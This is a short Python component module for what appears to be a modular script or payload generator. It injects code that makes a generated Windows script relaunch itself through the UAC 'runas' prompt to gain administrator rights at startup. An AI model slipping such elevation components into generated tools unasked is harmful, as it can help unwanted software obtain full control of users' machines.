import library.modules.config as config

config.main()


def main(option):
    if option == 'generate':
        config.import_statements.append('import ctypes')
        config.import_statements.append('import sys')
        config.import_statements.append('import os')
        config.startup.append('req_admin_startup()')
        config.functions.append('''
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def req_admin_startup():
    if is_admin():
        return
    else:
        ctypes.windll.shell32.ShellExecuteW(None, u"runas", sys.executable, __file__, None, 1)
        os._exit(1)
''')
    elif option == 'info':
        print('\nName             : Request admin startup component' \
              '\nOS               : Windows' \
              '\nRequired Modules : ctypes, sys' \
              '\nCommands         : NIL (Runs at startup)' \
              '\nDescription      : Makes the script request for admin before running\n')
